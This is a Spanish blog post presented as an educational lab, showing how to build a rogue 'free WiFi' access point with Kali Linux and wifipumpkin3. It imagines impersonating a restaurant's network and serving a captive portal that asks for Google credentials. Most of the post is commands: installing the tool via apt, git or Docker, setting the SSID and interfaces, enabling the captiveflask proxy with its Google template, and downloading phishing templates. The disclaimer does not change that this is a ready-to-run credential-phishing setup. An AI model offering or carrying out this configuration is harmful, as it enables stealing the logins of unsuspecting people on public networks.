---
title: "Rogue Ap Wifi"
layout: single
category: "Proyectos"
slug: "proyectos/rogue-ap-wifi"
date: 2025-09-30
---

# Rogue AP Wifi + Custom template

En este caso, el laboratorio trata de montar un punto de acceso de "Wifi Gratis", en el cual se accede sin contraseña, pero al conectarte a la red te pide que inicies sesión. 

Para el caso, se pueden utilizar o crear plantillas personalizadas, por ejemplo, supongamos que realizamos el laboratorio en un restaurante, creariamos un punto de acceso con el nombre del restaurante y un portal personalizado solicitando credenciales de acceso, por ejemplo a google.

___Esto es un proyecto educativo, del cual no me hago responsable de su uso___

### Herramientas e Instalación
En este caso tiraremos de **Kali Linux** y **Wifipumpkin3** Ya que nos permite crear nuestras plantillas personalizadas de una manera muy sencilla.

##### REQUISITOS
Tarjeta de red que permita **AP MODE** , y (opcional) **MONITOR MODE**
Tarjeta de red (sea inalámbrica o por ethernet), conectada a internet

```bash
# Instalación (metodo 1)
sudo apt install wifipumpkin3

# Método alternativo
git clone https://github.com/P0cL4bs/wifipumpkin3.git 
cd wifipumpkin3 
sudo make install

#LANZAMIENTO
wifipumpkin3
```



##### OPCIONAL (En docker)
```bash
# INSTALACIÓN
git clone https://github.com/P0cL4bs/wifipumpkin3.git
cd wifipumpkin3
sudo docker build -t "wifipumpkin3" .

#LANZAMIENTO
sudo docker run --privileged -ti --rm --name wifipumpkin3 --net host "wifipumpkin3" 
```

### Configuración AP
necesitamos averiguar los interfaces de red con `ifconfig`


```bash
wifipumpkin3

#mostrar ayuda
help

#configurar AP
ap
set interface <interfaz_para_el_ap>
set interface_net <interfaz_con_internet>
set ssid <nombre_ap>
ignore pydns_server
set proxy captiveflask
set captiveflask.force_ssredirect_to_url https://<url>
set captiveflask.proxy_port 443
set captiveflask.google true
start
```

### Descargar plantillas
```bash
# DESCARGAR PLANTILLAS POR DEFECTO
use.misc.extra_captiveflask
download

# Listar plantillas
list

#instalar plantilla
install <nombre>
```
